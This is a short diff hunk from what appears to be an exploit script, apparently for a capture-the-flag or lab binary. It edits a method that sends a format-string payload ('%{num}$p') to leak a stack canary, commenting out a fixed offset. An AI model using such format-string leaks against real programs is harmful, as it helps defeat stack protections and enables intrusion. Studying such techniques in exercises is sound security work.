@@ -28,7 +28,7 @@ class Exploit:
     
     def send_format_str(self, num):
         'sending format string to leak the stack canary'
-        num = 33
+        # num = 33
         with eval(self.p) as r:
             try:
                 payload = (f"%{num}$p").encode()
